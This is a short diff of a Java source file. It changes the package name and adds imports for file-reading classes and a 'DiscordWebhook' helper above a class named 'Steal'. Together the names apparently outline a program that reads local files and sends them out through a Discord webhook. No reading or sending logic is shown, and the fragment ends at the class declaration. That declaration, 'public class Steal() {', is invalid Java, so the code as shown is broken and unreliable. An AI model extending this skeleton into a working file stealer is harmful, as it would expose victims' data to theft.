@@ -1,4 +1,11 @@
-package myjavapackage;
+package myjavaprogram;
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
+import java.io.IOException;
+import javaprogram.text.TextDemo;
+import javaprogram.util.DiscordWebhook;
 
 public class Steal() {
 
